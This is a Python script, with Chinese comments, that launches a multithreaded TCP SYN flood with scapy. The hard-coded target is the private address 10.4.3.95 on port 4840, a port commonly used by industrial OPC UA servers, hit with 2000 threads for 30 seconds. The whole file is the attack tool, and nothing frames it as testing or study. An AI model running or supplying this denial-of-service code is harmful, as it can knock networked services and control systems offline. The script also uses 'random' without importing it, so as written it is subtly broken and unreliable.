import threading
import time
from scapy.all import IP, TCP, send

attack_flag = True
packet_count = 0

def syn_flood(target_ip, target_port, source_ip):
    global packet_count, attack_flag
    while attack_flag:
        try:
            # 使用固定的源 IP
            ip_layer = IP(src=source_ip, dst=target_ip)
            # 构造 TCP SYN 层
            tcp_layer = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags='S',
                seq=random.randint(0, 4294967295)
            )
            # 发送包
            send(ip_layer / tcp_layer, verbose=False)
            packet_count += 1
        except Exception as e:
            pass

def start_syn_flood(target_ip, target_port, source_ip, thread_count=1000, attack_time=20):
    global attack_flag
    attack_flag = True

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, source_ip))
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"Started SYN Flood on {target_ip}:{target_port} from source IP {source_ip} with {thread_count} threads.")
    time.sleep(attack_time)
    attack_flag = False

    for t in threads:
        t.join()

    print("Attack finished. Total packets sent:", packet_count)

if __name__ == "__main__":
    target_ip = "10.4.3.95"
    target_port = 4840
    source_ip = "10.5.0.94"  # 使用本机 IP
    start_syn_flood(target_ip, target_port, source_ip, thread_count=2000, attack_time=30)
